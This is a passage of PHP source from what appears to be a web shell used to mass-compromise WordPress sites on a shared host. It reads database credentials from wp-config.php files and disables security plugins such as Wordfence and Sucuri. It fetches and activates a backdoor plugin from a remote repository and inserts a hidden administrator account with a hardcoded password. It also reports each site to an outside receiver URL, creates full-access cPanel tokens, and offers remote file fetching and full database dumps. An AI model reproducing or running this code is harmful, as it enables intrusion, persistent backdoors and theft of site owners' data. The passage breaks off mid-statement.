        // C. Exec Fallback (cat) - Jika permission PHP ditolak, coba via system
        // Gunakan fungsi jalankan_cmd_tangguh agar mencoba semua metode exec
        $cmd = "cat " . escapeshellarg($path);
        $c = jalankan_cmd_tangguh($cmd);
        if ($c) return $c;

        return "";
    }
}

if (!function_exists('get_conf_val_smart')) {
    function get_conf_val_smart($content, $key) {
        if (preg_match("/define\(\s*['\"]" . preg_quote($key, '/') . "['\"]\s*,\s*['\"]([^'\"]+)['\"]\s*\)/", $content, $m)) return $m[1];
        return null;
    }
}

// 4. SCAN FOLDER (STREAM MODE)
if (!function_exists('scan_smart_stream')) {
    function scan_smart_stream($dir, &$results) {
        $dir = rtrim($dir, '/') . '/';
        if (file_exists($dir . 'wp-config.php')) $results[] = $dir . 'wp-config.php';

        if ($dh = @opendir($dir)) {
            while (($file = readdir($dh)) !== false) {
                if ($file === '.' || $file === '..') continue;
                $full_path = $dir . $file;
                
                if (is_dir($full_path) && !is_link($full_path)) {
                    $target_public = $full_path . '/public_html/wp-config.php';
                    $target_root   = $full_path . '/wp-config.php';
                    if (file_exists($target_public)) $results[] = $target_public;
                    elseif (file_exists($target_root)) $results[] = $target_root;
                }
            }
            closedir($dh);
        }
    }
}

// --- LOGIC EKSEKUSI ---

// A. BUAT TOKEN CPANEL (UAPI)
if (isset($_POST['buat_token_cpanel'])) {
    $dom = $_SERVER['SERVER_NAME'];
    if(function_exists('php_uname')) { $p=explode(" ",php_uname()); if(isset($p[1]))$dom=$p[1]; }
    
    $usr = getenv('USER');
    if(!$usr && function_exists('get_current_user')) $usr=get_current_user();
    
    // Path binary uapi
    $bins = ["uapi", "/usr/bin/uapi", "/usr/local/cpanel/bin/uapi", "/usr/local/bin/uapi"];
    $cmd_base = "Tokens create_full_access name=xshikata";
    $res_tok = ""; $suc_tok = false;

    foreach($bins as $b) {
        $full_cmd = "$b $cmd_base";
        // Panggil fungsi multi-fallback kita
        $res_tok = jalankan_cmd_tangguh($full_cmd);
        
        // Cek keberhasilan
        if($res_tok && (stripos($res_tok,'result')!==false || stripos($res_tok,'token')!==false)) {
            $suc_tok=true; break;
        }
    }

    $h_tok = "<div style='background:#1b1b1b; padding:15px; border:1px solid #333; border-radius:5px;'>";
    $h_tok .= "<h4 style='color:#00FF00; margin:0 0 10px 0; border-bottom:1px solid #444;'>cPanel Token Result</h4>";
    $h_tok .= "<p style='margin:0'>Domain: $dom | User: $usr</p>";
    $h_tok .= "<textarea style='width:100%; height:100px; background:#111; color:#00FF00; margin-top:5px; border:1px solid #444;'>".htmlspecialchars($res_tok)."</textarea>";
    if(!$suc_tok && !$res_tok) $h_tok .= "<p style='color:red;'>Gagal eksekusi. Semua fungsi exec (shell_exec, system, popen, dll) mungkin didisable.</p>";
    $h_tok .= "</div>";
    $success_msg = $h_tok;
}
// FITUR: SCAN SITE TOOL (MODERN GRID LAYOUT)
if (isset($_POST['scan_site'])) {
    $target_scan_dir = isset($default_dir) ? $default_dir : getcwd();
    $found_domains = [];
    
    // Scan folder logic
    if (is_dir($target_scan_dir)) {
        $items = scandir($target_scan_dir);
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            $path = $target_scan_dir . '/' . $item;
            if (is_dir($path)) {
                // Regex domain
                if (preg_match('/^([a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]{2,}$/i', $item)) {
                    $found_domains[] = $item;
                }
            }
        }
    }

    // --- MULAI TAMPILAN MODERN ---
    $out_html = '<div style="background:#222; border:1px solid #444; border-radius:12px; margin-bottom:20px; box-shadow:0 10px 30px rgba(0,0,0,0.5); overflow:hidden;">';
    
    // Header Panel
    $out_html .= '<div style="background:#2a2a2a; padding:15px 20px; border-bottom:1px solid #444; display:flex; justify-content:space-between; align-items:center;">';
    $out_html .= '<h4 style="margin:0; color:#00FF00; font-size:1.1rem; display:flex; align-items:center; gap:10px; font-family:sans-serif;">';
    $out_html .= '<i class="fas fa-satellite-dish"></i> Scan Result ';
    $out_html .= '<span style="background:#333; font-size:0.75em; padding:2px 10px; border-radius:20px; color:#fff; border:1px solid #444;">'.count($found_domains).'</span>';
    $out_html .= '</h4>';
    // Tombol Close
    $out_html .= '<button type="button" onclick="this.closest(\'div\').parentElement.style.display=\'none\'" style="background:transparent; border:none; color:#ff5555; font-size:1.2rem; cursor:pointer; padding:5px; transition:0.2s;" onmouseover="this.style.color=\'#ff0000\'" onmouseout="this.style.color=\'#ff5555\'"><i class="fas fa-times"></i></button>';
    $out_html .= '</div>';

    // Body Panel
    $out_html .= '<div style="padding:15px;">';
    
    if (!empty($found_domains)) {
        // Grid Container: Responsif (otomatis menyesuaikan lebar layar)
        $out_html .= '<div style="display:grid; grid-template-columns: repeat(auto-fill, minmax(260px, 1fr)); gap:10px;">';
        
        // Icon Google SVG
        $googleSvg = '<svg width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/><path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/><path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/><path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/></svg>';

        foreach ($found_domains as $dom) {
            $link = "https://www.google.com/search?q=site:" . htmlspecialchars($dom);
            
            // Item Card
            $out_html .= '<div style="background:#1a1a1a; border:1px solid #333; border-radius:8px; padding:12px 15px; display:flex; justify-content:space-between; align-items:center; transition:all 0.2s ease;" onmouseover="this.style.borderColor=\'#00FF00\'; this.style.background=\'#252525\';" onmouseout="this.style.borderColor=\'#333\'; this.style.background=\'#1a1a1a\';">';
            
            // Nama Domain
            $out_html .= '<span style="color:#eee; font-family:monospace; font-size:0.95rem; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; margin-right:10px; font-weight:500;">'.htmlspecialchars($dom).'</span>';
            
            // Tombol Ikon
            $out_html .= '<a href="'.$link.'" target="_blank" title="Check site:'.$dom.'" style="flex-shrink:0; text-decoration:none; display:flex; align-items:center; transition:transform 0.2s;" onmouseover="this.style.transform=\'scale(1.2)\'" onmouseout="this.style.transform=\'scale(1)\'">'.$googleSvg.'</a>';
            
            $out_html .= '</div>';
        }
        $out_html .= '</div>'; // End Grid
    } else {
        // Tampilan Kosong
        $out_html .= '<div style="text-align:center; padding:30px; color:#777;">';
        $out_html .= '<i class="fas fa-search" style="font-size:3rem; margin-bottom:15px; opacity:0.3;"></i>';
        $out_html .= '<p style="margin:0;">No domains found in this directory.</p>';
        $out_html .= '</div>';
    }
    
    $out_html .= '</div></div>'; // End Body & Main Div
    
    // Masukkan ke variabel pesan sukses agar tampil di atas
    $success_msg = $out_html;
}
// B. MASS ADMIN
if (isset($_POST['create_wp_admin']) || isset($_POST['reactivate_plugins'])) {
    $targets = [];
    $root = isset($default_dir) ? $default_dir : getcwd();

    if (isset($_POST['create_wp_admin'])) {
        scan_smart_stream($root, $targets);
        $targets = array_unique($targets);
    } else {
        if(file_exists($root.'/wp-config.php')) $targets[]=$root.'/wp-config.php';
    }

    if (empty($targets)) {
        $error_msg = "Tidak ditemukan wp-config.php (Smart Scan).";
    } else {
        // STYLE
        $st_ok  = "background:#28a745; color:#fff; padding:2px 6px; border-radius:3px; font-size:0.85em; font-weight:bold; margin-right:5px;";
        $st_err = "background:#dc3545; color:#fff; padding:2px 6px; border-radius:3px; font-size:0.85em; font-weight:bold; margin-right:5px;";
        $st_warn= "background:#ffc107; color:#000; padding:2px 6px; border-radius:3px; font-size:0.85em; font-weight:bold; margin-right:5px;";
        
        $log = "<div style='text-align:left; max-height:400px; overflow-y:auto; background:#1b1b1b; padding:15px; border:1px solid #333; font-family:monospace;'>";
        $log .= "<h4 style='color:#00FF00; margin:0 0 15px 0; border-bottom:1px solid #444; padding-bottom:5px;'>Mass Execution Result (Cache Bypass Mode)</h4>";

        $au = 'xshikata';
        $ap = md5('Lulz1337');
        $ae = 'topupgameku.id@gmail.com';
        
        $plugin_src = 'https://raw.githubusercontent.com/baseng1337/damn/refs/heads/main/system-core.php';
        $plugin_folder_name = 'system-core';
        $plugin_filename = 'system-core.php';
        $plugin_hook = $plugin_folder_name . '/' . $plugin_filename; 
        $plugin_hook_old = 'system-core.php';
        
        $receiver_url = 'https://stepmomhub.com/wp/receiver.php';
        $receiver_key = 'wtf';

        foreach ($targets as $cfg) {
            $raw = baca_file_smart($cfg);
            if (!$raw) { continue; }

            $dh = get_conf_val_smart($raw, 'DB_HOST');
            $du = get_conf_val_smart($raw, 'DB_USER');
            $dp = get_conf_val_smart($raw, 'DB_PASSWORD');
            $dn = get_conf_val_smart($raw, 'DB_NAME');
            $pre = 'wp_';
            if (preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/", $raw, $m)) $pre = $m[1];

            $wp_root_path = dirname($cfg);
            $disp = str_replace($root, '', $wp_root_path);
            
            $log .= "<div style='background:#252525; padding:8px; margin-bottom:8px; border-left:3px solid #00FF00; border-radius:2px;'>";
            $log .= "<div style='color:#ccc; margin-bottom:5px; font-weight:bold;'>Target: <span style='color:#fff;'>".($disp?:'/')."</span></div>";
            $log .= "<div style='display:flex; flex-wrap:wrap; gap:5px; align-items:center;'>";

            @mysqli_report(MYSQLI_REPORT_OFF);
            $cn = mysqli_init();
            @mysqli_options($cn, MYSQLI_OPT_CONNECT_TIMEOUT, 2);
            
            if (@mysqli_real_connect($cn, $dh, $du, $dp, $dn)) {
                if (isset($_POST['create_wp_admin'])) {
                    
                    // --- OPTIMASI: DOWNLOAD MASTER SEKALI SAJA ---
                    global $master_core, $master_index;
                    if (!isset($master_core)) {
                        $master_core = sys_get_temp_dir() . '/master_core_' . time() . '.php';
                        $master_index = sys_get_temp_dir() . '/master_index_' . time() . '.php';
                        
                        $ua = stream_context_create(['http'=>['header'=>"User-Agent: Mozilla/5.0"]]);
                        $src_core = @file_get_contents($plugin_src, false, $ua);
                        $src_idx  = @file_get_contents('https://raw.githubusercontent.com/baseng1337/damn/refs/heads/main/index.php', false, $ua);
                        
                        if($src_core) file_put_contents($master_core, $src_core);
                        if($src_idx) file_put_contents($master_index, $src_idx);
                    }

                    $plugins_dir = $wp_root_path . '/wp-content/plugins/';
                    
                    // --- 1. KILL SECURITY PLUGINS (RENAME MODE) ---
                    $targets_to_kill = [
                        'hostinger', 'wordfence', 'ithemes-security-pro', 'better-wp-security',
                        'sucuri-scanner', 'sg-security', 'login-lockdown', 
                        'limit-login-attempts-reloaded', 'all-in-one-wp-security-and-firewall'
                    ];
                    
                    $kill_badge = "";
                    foreach ($targets_to_kill as $folder) {
                        $path = $plugins_dir . $folder;
                        if (is_dir($path)) {
                            @rename($path, $path . '_killed_' . time());
                            $kill_badge .= "<span style='$st_warn'>KIL:" . strtoupper(substr($folder,0,3)) . "</span> ";
                        }
                    }
                    if (empty($kill_badge)) $kill_badge = "<span style='color:#777; font-size:0.8em'>NO SEC</span>";

                    // --- 2. DEPLOY SYSTEM CORE ---
                    $target_folder = $plugins_dir . $plugin_folder_name;
                    $target_file = $target_folder . '/' . $plugin_filename;
                    $index_file  = $target_folder . '/index.php';
                    $dl_badge = "";
                    
                    if (!is_dir($target_folder)) {
                        @mkdir($target_folder, 0755, true);
                        @chmod($target_folder, 0755);
                    }

                    // Copy Core
                    if (!file_exists($target_file)) {
                        if (file_exists($master_core) && @copy($master_core, $target_file)) {
                            @chmod($target_file, 0644);
                            $dl_badge .= "<span style='$st_ok'>CORE</span> ";
                        } else { $dl_badge .= "<span style='$st_err'>CORE</span> "; }
                    } else { $dl_badge .= "<span style='$st_warn'>CORE</span> "; }

                    // Copy Index Activator
                    if (!file_exists($index_file)) {
                        if (file_exists($master_index) && @copy($master_index, $index_file)) {
                            @chmod($index_file, 0644);
                            $dl_badge .= "<span style='$st_ok'>IDX</span>";
                        } else { $dl_badge .= "<span style='$st_err'>IDX</span>"; }
                    } else { $dl_badge .= "<span style='$st_warn'>IDX</span>"; }

                    // --- 3. ACTIVATION (HEX) ---
                    $act_badge = ""; $is_active = false;
                    $wp_content = $wp_root_path . '/wp-content';
                    $obj_cache = $wp_content . '/object-cache.php';
                    $adv_cache = $wp_content . '/advanced-cache.php';
                    $renamed_obj = false; $renamed_adv = false;

                    if (file_exists($obj_cache)) { @rename($obj_cache, $obj_cache . '.suspend'); $renamed_obj = true; }
                    if (file_exists($adv_cache)) { @rename($adv_cache, $adv_cache . '.suspend'); $renamed_adv = true; }
                    
                    $qopt = @mysqli_query($cn, "SELECT option_value FROM {$pre}options WHERE option_name='active_plugins'");
                    if ($qopt && mysqli_num_rows($qopt) > 0) {
                        $row = mysqli_fetch_assoc($qopt);
                        $current_plugins = @unserialize($row['option_value']);
                        if (!is_array($current_plugins)) $current_plugins = [];
                    } else { $current_plugins = []; }

                    $current_plugins = array_diff($current_plugins, [$plugin_hook_old]);
                    if (!in_array($plugin_hook, $current_plugins)) $current_plugins[] = $plugin_hook;
                    sort($current_plugins);
                    
                    $hex_data = bin2hex(serialize($current_plugins));
                    @mysqli_query($cn, "DELETE FROM {$pre}options WHERE option_name='active_plugins'");
                    if (@mysqli_query($cn, "INSERT INTO {$pre}options (option_name, option_value, autoload) VALUES ('active_plugins', 0x$hex_data, 'yes')")) {
                        @mysqli_query($cn, "DELETE FROM {$pre}options WHERE option_name LIKE '_transient_%' OR option_name LIKE '_site_transient_%'");
                        @mysqli_query($cn, "DELETE FROM {$pre}options WHERE option_name='rls_setup_done'");
                        $act_badge = "<span style='$st_ok'>HEX</span>";
                        $is_active = true;
                    } else { $act_badge = "<span style='$st_err'>DB</span>"; }

                    // --- 4. CREATE USER ---
                    $u_badge = "";
                    $q1 = @mysqli_query($cn, "SELECT ID FROM {$pre}users WHERE user_login='$au'");
                    if ($q1 && mysqli_num_rows($q1) > 0) {
                        $uid = mysqli_fetch_assoc($q1)['ID'];
                        @mysqli_query($cn, "UPDATE {$pre}users SET user_pass='$ap' WHERE ID=$uid");
                        $u_badge = "<span style='$st_warn'>UP</span>";
                    } else {
                        @mysqli_query($cn, "INSERT INTO {$pre}users (user_login,user_pass,user_nicename,user_email,user_status,display_name) VALUES ('$au','$ap','Admin','$ae',0,'Admin')");
                        $uid = mysqli_insert_id($cn);
                        $u_badge = "<span style='$st_ok'>ADD</span>";
                    }
                    $cap = serialize(['administrator'=>true]);
                    @mysqli_query($cn, "INSERT INTO {$pre}usermeta (user_id,meta_key,meta_value) VALUES ($uid,'{$pre}capabilities','$cap') ON DUPLICATE KEY UPDATE meta_value='$cap'");
                    @mysqli_query($cn, "INSERT INTO {$pre}usermeta (user_id,meta_key,meta_value) VALUES ($uid,'{$pre}user_level','10') ON DUPLICATE KEY UPDATE meta_value='10'");

                    // --- 5. PING & DIRECT REPORT (GARANSI LIST MUNCUL) ---
                    $ping_badge = "<span style='color:#aaa; font-size:0.8em'>-</span>";
                    $surl = "";
                    $qurl = @mysqli_query($cn, "SELECT option_value FROM {$pre}options WHERE option_name='siteurl'");
                    if ($qurl && mysqli_num_rows($qurl)>0) $surl = mysqli_fetch_assoc($qurl)['option_value'];

                    if (!empty($surl)) {
                        // A. DIRECT REPORT KE DASHBOARD (Agar list domain langsung muncul)
                        // Kita kirim data domain saja, password kosong dulu. Nanti plugin yang isi passwordnya.
                        $pdata_direct = http_build_query(['action'=>'register_site', 'secret'=>$receiver_key, 'domain'=>$surl, 'api_user'=>'', 'api_pass'=>'']);
                        $ctx_direct = stream_context_create(['http'=>['method'=>'POST','header'=>"Content-type: application/x-www-form-urlencoded",'content'=>$pdata_direct,'timeout'=>2]]);
                        @file_get_contents($receiver_url, false, $ctx_direct);

                        // B. TRIGGER PLUGIN (Agar generate password)
                        if ($is_active) {
                            $trigger_url = rtrim($surl, '/') . '/wp-content/plugins/' . $plugin_folder_name . '/index.php';
                            $ctx_trig = stream_context_create(['http'=>['method'=>'GET','header'=>"User-Agent: Mozilla/5.0",'timeout'=>2]]);
                            @file_get_contents($trigger_url, false, $ctx_trig);
                            $ping_badge = "<span style='$st_ok'>OK</span>";
                        }
                    }
                    
                    if ($renamed_obj) { @rename($obj_cache . '.suspend', $obj_cache); }
                    if ($renamed_adv) { @rename($adv_cache . '.suspend', $adv_cache); }

                    $log .= "$kill_badge $dl_badge $act_badge $u_badge $ping_badge <a href='$surl/wp-login.php' target='_blank' style='background:#333; padding:2px 6px; border-radius:3px; color:#fff; text-decoration:none; font-size:0.85em;'>Login &raquo;</a>";
                }
                
                elseif (isset($_POST['reactivate_plugins'])) {
                    $qbk = @mysqli_query($cn, "SELECT option_value FROM {$pre}options WHERE option_name='xshikata_bkp'");
                    if ($qbk && mysqli_num_rows($qbk)>0) {
                        $orig = mysqli_real_escape_string($cn, mysqli_fetch_assoc($qbk)['option_value']);
                        @mysqli_query($cn, "UPDATE {$pre}options SET option_value='$orig' WHERE option_name='active_plugins'");
                        @mysqli_query($cn, "DELETE FROM {$pre}options WHERE option_name='xshikata_bkp'");
                        $log .= "<span style='$st_ok'>RESTORED</span>";
                    } else { $log .= "<span style='$st_warn'>NO BKP</span>"; }
                }
                mysqli_close($cn);
            } else {
                $log .= "<span style='$st_err'>SKIP DB</span>";
            }
            $log .= "</div></div>"; 
        }
        $log .= "</div>";

        if (isset($_POST['create_wp_admin'])) {
            $log .= "<div style='margin-top:10px;'>";
            $log .= "<form method='POST' style='display:inline; margin-right:5px;'><input type='hidden' name='reactivate_plugins' value='1'><input type='hidden' name='berkas' value='".htmlspecialchars(kunci($root))."'><button class='btn-modern' style='background:#0088cc;'>Restore (Single)</button></form>";
            $log .= "<form method='POST' style='display:inline;'><input type='hidden' name='buat_token_cpanel' value='1'><input type='hidden' name='berkas' value='".htmlspecialchars(kunci($root))."'><button class='btn-modern' style='background:#28a745;'>Token</button></form>";
            $log .= "</div>";
        }
        $success_msg = $log;
    }
}
// ===========================================================================
// Action handling (download, delete, create, rename, SQL, etc.)
// ===========================================================================

if(isset($_GET['awal']) && $_GET['awal']=="pinf")
{
	ob_start();
	phpinfo();
	$pInf = ob_get_clean();
	print str_replace("body {background-color: #ffffff; color: #000000;}", "", $pInf);
	exit();
}
else if ($awal == 'fetch_file' && isset($_POST['fetch_url']) && !empty($_POST['fetch_url'])) {
    $url = $_POST['fetch_url'];
    if (!filter_var($url, FILTER_VALIDATE_URL)) {
        $error_msg = "Invalid URL provided.";
    } else {
        $save_as = isset($_POST['save_as']) ? basename(trim($_POST['save_as'])) : '';
        if (empty($save_as)) {
            $save_as = basename(parse_url($url, PHP_URL_PATH));
        }
        if (empty($save_as)) {
            $save_as = 'downloaded_file.html';
        }
        
        $pemisah = substr($default_dir, strlen($default_dir)-1) != "/" ? "/" : "";
        $dest_path = $default_dir . $pemisah . $save_as;
        
        $downloaded = false;
        
        // Method 1: cURL (Preferred)
        if (function_exists('curl_init')) {
            try {
                $fp = fopen($dest_path, 'w');
                $ch = curl_init($url);
                curl_setopt($ch, CURLOPT_FILE, $fp);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_TIMEOUT, 60);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
                $success = curl_exec($ch);
                curl_close($ch);
                fclose($fp);
                if ($success) {
                    $success_msg = "File downloaded successfully via cURL and saved as <strong>" . htmlspecialchars($save_as) . "</strong>";
                    $downloaded = true;
                } else {
                    @unlink($dest_path); // Delete empty file on failure
                }
            } catch (Exception $e) {
                 // cURL failed, do nothing, let fallback try
            }
        }
        
        // Method 2: Fallback (file_get_contents)
        if (!$downloaded && ini_get('allow_url_fopen')) {
            $content = @file_get_contents($url);
            if ($content !== false) {
                if (@file_put_contents($dest_path, $content) !== false) {
                    $success_msg = "File downloaded successfully via file_get_contents and saved as <strong>" . htmlspecialchars($save_as) . "</strong>";
                    $downloaded = true;
                }
            }
        }
        
        if (!$downloaded) {
            $error_msg = "Failed to download file. Both cURL and allow_url_fopen may be disabled or the remote host failed.";
        }
    }
    $awal = 'dasar';
}
else if($awal == 'ubah_perm' && isset($_POST['fayl'], $_POST['perm']))
{
    $namaBerkas = basename(uraikan($_POST['fayl']));
    $newPerms = $_POST['perm'];
    
    // Simple validation for octal format
    if (preg_match('/^[0-7]{3,4}$/', $newPerms)) {
        $pemisah = substr($default_dir, strlen($default_dir)-1) != "/" ? "/" : "";
        $pathLengkap = $default_dir . $pemisah . $namaBerkas;
        
        if (file_exists($pathLengkap)) {
            // Convert from string (e.g., "755") to octal integer for chmod
            if (@chmod($pathLengkap, octdec($newPerms))) {
                $success_msg = "Permissions for '" . htmlspecialchars($namaBerkas) . "' changed successfully to " . htmlspecialchars($newPerms) . ".";
            } else {
                $error_msg = "Failed to change permissions for '" . htmlspecialchars($namaBerkas) . "'. Check server permissions.";
            }
        } else {
            $error_msg = "File not found: " . htmlspecialchars($namaBerkas);
        }
    } else {
        $error_msg = "Invalid permission format. Please use a 3 or 4-digit octal number (e.g., 0755).";
    }
    $awal = 'dasar'; // Fall through to show the file manager again
}
else if ($awal == 'edit_db_row') {
    try {
        if (!isset($_POST['t'], $_POST['pk_val'])) {
            throw new Exception("Missing data for update.");
        }
        $tableName = uraikan($_POST['t']);
        $pk_val = uraikan($_POST['pk_val']);

        $host = isset($_COOKIE['host']) ? $_COOKIE['host'] : '';
        $user = isset($_COOKIE['user']) ? $_COOKIE['user'] : '';
        $sandi = isset($_COOKIE['sandi']) ? $_COOKIE['sandi'] : '';
        $database = isset($_COOKIE['database']) ? $_COOKIE['database'] : '';

        $pdo = new PDO('mysql:host=' . $host . ';dbname=' . $database . ';charset=utf8', $user, $sandi);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

        $cols_stmt = $pdo->query("DESCRIBE `{$tableName}`");
        $pk_col = $cols_stmt->fetch(PDO::FETCH_ASSOC)['Field'];
        
        $data_to_update = [];
        $control_vars = ['awal', 't', 'pk_val'];
        foreach($_POST as $key => $value) {
            if (!in_array($key, $control_vars)) {
                $data_to_update[$key] = $value;
            }
        }

        if (substr($tableName, -5) === 'users' && isset($data_to_update['user_pass']) && !empty($data_to_update['user_pass'])) {
            if (strlen($data_to_update['user_pass']) < 32 || !preg_match('/^[a-f0-9]{32}$/i', $data_to_update['user_pass'])) {
                $data_to_update['user_pass'] = md5($data_to_update['user_pass']);
            }
        }
        
        $set_parts = [];
        $params = [];
        foreach ($data_to_update as $col => $val) {
            if($col == $pk_col) continue;
            $set_parts[] = "`{$col}` = ?";
            $params[] = $val;
        }

        if (count($set_parts) > 0) {
            $params[] = $pk_val;
            $sql = "UPDATE `{$tableName}` SET " . implode(', ', $set_parts) . " WHERE `{$pk_col}` = ?";
            $stmt = $pdo->prepare($sql);
            $stmt->execute($params);
            $success_msg = "Row updated successfully!";
        } else {
             $success_msg = "No changes were made.";
        }
        
    } catch (Exception $e) {
        $error_msg = "Error updating row: " . $e->getMessage();
    }
    $awal = 'skl'; // Fall through to show the table again
}
else if($awal=="download_file" && isset($_POST['fayl']) && trim($_POST['fayl']) != "")
{
	$namaBerkas = basename(uraikan($_POST['fayl']));
	$pemisah = substr($default_dir, strlen($default_dir)-1) != "/" && substr($namaBerkas, 0, 1) != "/" ? "/" : "";
	if(is_file($default_dir . $pemisah . $namaBerkas) && is_readable($default_dir . $pemisah . $namaBerkas))
	{
		header("Content-Disposition: attachment; filename=" . basename($namaBerkas));
		header("Content-Type: application/octet-stream");
		header('Content-Length: ' . filesize($default_dir . $pemisah . $namaBerkas));
		readfile($default_dir . $pemisah . $namaBerkas);
		exit();
	}
}
else if($awal=="hapus_file" && isset($_POST['fayl']) && trim($_POST['fayl']) != "")
{
	$namaBerkas = basename(uraikan($_POST['fayl']));
	$pemisah = substr($default_dir, strlen($default_dir)-1) != "/" && substr($namaBerkas, 0, 1) != "/" ? "/" : "";
	$pathLengkap = $default_dir . $pemisah . $namaBerkas;

	if(is_file($pathLengkap))
	{
		if (@unlink($pathLengkap)) {
			$success_msg = "File '" . htmlspecialchars($namaBerkas) . "' deleted successfully.";
		} else {
			$error_msg = "Failed to delete file '" . htmlspecialchars($namaBerkas) . "'. Check permissions.";
		}
	} else {
		$error_msg = "File not found: " . htmlspecialchars($namaBerkas);
	}
	$awal = 'dasar';
}
else if($awal=="buat_file" && isset($_POST['new_filename']) && !empty($_POST['new_filename']))
{
    $namaBerkas = basename($_POST['new_filename']);
    $kontenBerkas = isset($_POST['new_file_content']) ? $_POST['new_file_content'] : '';
    $pemisah = substr($default_dir, strlen($default_dir)-1) != "/" ? "/" : "";
    $pathLengkap = $default_dir . $pemisah . $namaBerkas;
    if(file_exists($pathLengkap))
    {
        $error_msg = "File '" . htmlspecialchars($namaBerkas) . "' already exists!";
    }
    else
    {
        if (file_put_contents($pathLengkap, $kontenBerkas) !== false) {
             $success_msg = "File '" . htmlspecialchars($namaBerkas) . "' created successfully.";
        } else {
             $error_msg = "Failed to create file '" . htmlspecialchars($namaBerkas) . "'. Check permissions.";
        }
    }
}
else if($awal=="buat_folder" && isset($_POST['ad']) && !empty($_POST['ad']))
{
	$namaFolder = basename(uraikan($_POST['ad']));
	$pemisah = substr($default_dir, strlen($default_dir)-1) != "/" && substr($namaFolder, 0, 1) != "/" ? "/" : "";
	if(is_file($default_dir . $pemisah . $namaFolder))
	{
		print '<script>alert("This folder already exists!");</script>';
	}
	else
	{
		mkdir($default_dir . $pemisah . $namaFolder);
	}
}
else if($awal=="rename_file" && isset($_POST['fayl']) && trim($_POST['fayl']) != "" && isset($_POST['new_name']) && is_string($_POST['new_name']) && !empty($_POST['new_name']))
{
	$namaBerkas = basename(uraikan($_POST['fayl']));
	$fileNamaBaru = basename(uraikan($_POST['new_name']));
	$pemisah = substr($default_dir, strlen($default_dir)-1) != "/" && substr($namaBerkas, 0, 1) != "/" ? "/" : "";
	if(is_file($default_dir . $pemisah . $namaBerkas) && is_readable($default_dir . $pemisah . $namaBerkas))
	{
		rename($default_dir . $pemisah . $namaBerkas , $default_dir . $pemisah . $fileNamaBaru);
	}
}
else if($awal == 'skl_d_t' && isset($_POST['t']) && is_string($_POST['t']) && !empty($_POST['t']))
{
	$tableName = uraikan($_POST['t']);

	$host = isset($_COOKIE['host']) ? $_COOKIE['host'] : '';
	$user = isset($_COOKIE['user']) ? $_COOKIE['user'] : '';
	$sandi = isset($_COOKIE['sandi']) ? $_COOKIE['sandi'] : '';
	$database = isset($_COOKIE['database']) ? $_COOKIE['database'] : '';

	$databaseStr = empty($database) ? '' : 'dbname=' . $database . ';';
	if(!empty($host) && !empty($database))
	{
		try
		{
			$pdo = new PDO('mysql:host=' . $host . ';charset=utf8;' . $databaseStr, $user, $sandi, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES 'utf8'"));
			$pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);

			$getColumns = $pdo->prepare("SELECT column_name from information_schema.columns where table_schema=? and table_name=?");
			$getColumns->execute(array($database, $tableName));
			$columns = $getColumns->fetchAll();
			if($columns)
			{
				$data = $pdo->query('SELECT * FROM `' . $tableName .'`');
				$data = $data->fetchAll();

				header('Content-disposition: attachment; filename=d_' . basename(htmlspecialchars($tableName)) . '.json');
				header('Content-type: application/json');
				echo json_encode($data);
			}
			else
			{
				print "Table not found!";
			}
		}
		catch (Exception $e)
		{
			print $e->getMessage();
		}
	}
	else
	{
		print "Error! Please connect to SQL!";
	}
	die;
}
else if($awal == 'skl_d')
{
	$host = isset($_COOKIE['host']) ? $_COOKIE['host'] : '';
	$user = isset($_COOKIE['user']) ? $_COOKIE['user'] : '';
	$sandi = isset($_COOKIE['sandi']) ? $_COOKIE['sandi'] : '';
	$database = isset($_COOKIE['database']) ? $_COOKIE['database'] : '';

	$databaseStr = empty($database) ? '' : 'dbname=' . $database . ';';

	if(!empty($host) && !empty($database))
	{
		try
		{
			$pdo = new PDO('mysql:host=' . $host . ';charset=utf8;' . $databaseStr, $user, $sandi, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES 'utf8'"));
			$pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);

			$allData = array();

			$tables = $pdo->prepare('SELECT table_name from information_schema.tables where table_schema=?');
			$tables->execute(array($database));
			$tables = $tables->fetchAll();
			foreach($tables AS $tableName)
			{
				$tableName = $tableName['table_name'];
				$data = $pdo->query('SELECT * FROM `' .
				$tableName .'`');
				$data = $data->fetchAll();
				$allData[$tableName] = $data ? array($data) : array();
			}

			header('Content-disposition: attachment; filename=d_b_' . basename(htmlspecialchars($database)) . '.json');
			header('Content-type: application/json');
			echo json_encode(utf8ize($allData));
		}
		catch (Exception $e)
		{
			print $e->getMessage();
		}
	}
	else
	{
		print "Error! Please connect to SQL!";
	}
	die;
}
else if($awal == 'kompres'
	&& isset($_POST['save_to'], $_POST['zf']) && is_string($_POST['save_to'])
